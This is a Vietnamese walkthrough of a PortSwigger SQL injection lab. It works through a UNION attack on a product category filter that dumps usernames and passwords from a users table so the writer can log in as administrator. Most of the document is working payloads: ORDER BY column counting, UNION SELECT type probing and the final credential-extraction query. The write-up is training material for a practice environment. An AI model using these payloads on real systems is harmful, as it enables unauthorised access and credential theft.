![[Pasted image 20220617095400.png]](https://github.com/LanPhuong07/PortSwigger/blob/main/pic/Pasted%20image%2020220617095400.png)

---------------

**MÔ TẢ**

Lab này chứa lỗ hổng SQL injection trong bộ lọc danh mục sản phẩm. Kết quả từ truy vấn được trả về trong phản hồi của ứng dụng, vì vậy bạn có thể sử dụng UNION để tấn công truy xuất dữ liệu từ các bảng khác. Để thực hiện một cuộc tấn công như vậy, bạn cần kết hợp một số kỹ thuật bạn đã học trong các phòng thí nghiệm trước đó.

Cơ sở dữ liệu chứa một bảng khác được gọi là ``user``, với các cột được gọi là ``username`` và ``password``.

Để giải quyết lab, cần thực hiện một cuộc tấn công SQL injection UNION để truy xuất tất cả usernames và passwords, đồng thời sử dụng thông tin để đăng nhập với tư cách ``administrartor``.

<h1>HƯỚNG DẪN</h1>

Bước 1: Xác định số cột
Bước 2: Xác định kiểu dữ liệu
Bước 3: Thực hiện tấn công

<h1>GIẢI QUYẾT</h1>

<h2>1) Xác định số cột</h2> 

> 'order by 1--
> 'order by 2--
> 'order by 3-- -> 500

-> Số cột của bảng là 2

<h2>2) Xác định kiểu dữ liệu của các cột</h2>

Chọn a, b từ các sản phẩm mà ``?category=Lifestyle'``

> 'UNION select 'a', NULL--
> 'UNION select 'a ',' b '--

-> cả hai cột đều thuộc kiểu dữ liệu string

![[Pasted image 20220617100445.png]](https://github.com/LanPhuong07/PortSwigger/blob/main/pic/Pasted%20image%2020220617100445.png)

> ' UNION select username, password from users--

![[Pasted image 20220617100526.png]](https://github.com/LanPhuong07/PortSwigger/blob/main/pic/Pasted%20image%2020220617100526.png)

Đăng nhập thành công!

![[Pasted image 20220617100635.png]](https://github.com/LanPhuong07/PortSwigger/blob/main/pic/Pasted%20image%2020220617100635.png)